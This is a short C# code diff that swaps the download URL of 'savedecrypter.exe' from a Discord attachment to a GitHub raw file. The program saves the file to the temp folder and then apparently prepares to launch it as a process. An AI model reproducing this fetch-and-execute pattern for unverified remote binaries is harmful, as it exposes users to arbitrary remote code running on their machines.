@@ -79,7 +79,7 @@ namespace gtfocunt
             {
                 File.Delete(temp + "\\savedecrypter.exe");
             }
-            webclient.DownloadFile("https://cdn.discordapp.com/attachments/910537250067087450/910537668985778236/savedecrypter.exe", temp + "\\savedecrypter.exe");
+            webclient.DownloadFile("https://github.com/OnTheScoot/truflo/raw/main/savedecrypter.exe", temp + "\\savedecrypter.exe");
             Process process = new Process();
             ProcessStartInfo info = new ProcessStartInfo()
             {
